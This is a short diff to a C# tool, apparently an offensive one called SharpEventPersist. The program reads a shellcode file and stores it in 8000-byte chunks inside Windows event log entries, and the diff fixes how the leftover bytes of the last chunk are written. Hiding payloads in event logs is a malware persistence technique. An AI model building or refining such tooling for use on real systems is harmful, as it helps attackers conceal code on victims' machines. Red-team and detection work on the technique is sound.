@@ -10,7 +10,7 @@ namespace SharpEventPersist
     class Program
     {
         public static int EventWrites = 0;
-        private static int i;
+        //public static int i = 0;
 
         public static void PrintHelp()
         {
@@ -89,12 +89,12 @@ namespace SharpEventPersist
             byte[] shellcode = File.ReadAllBytes(file);
 
             var realcount = (int)(shellcode.Length / 8000);
+            var remainder = (int)(shellcode.Length % 8000);
 
             for (var i = 0; i < realcount; i++)
                 delegate_bytes(source, instanceid, eventlog, shellcode, 8000, i * 8000);
-
-            var remainder = (int)(shellcode.Length % 8000);
-            delegate_bytes(source, instanceid, eventlog, shellcode, 8000, i * 8000);
+            
+            delegate_bytes(source, instanceid, eventlog, shellcode, remainder, realcount * 8000);
 
             EventLog log = new EventLog(eventlog);
             var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == instanceint).ToList();
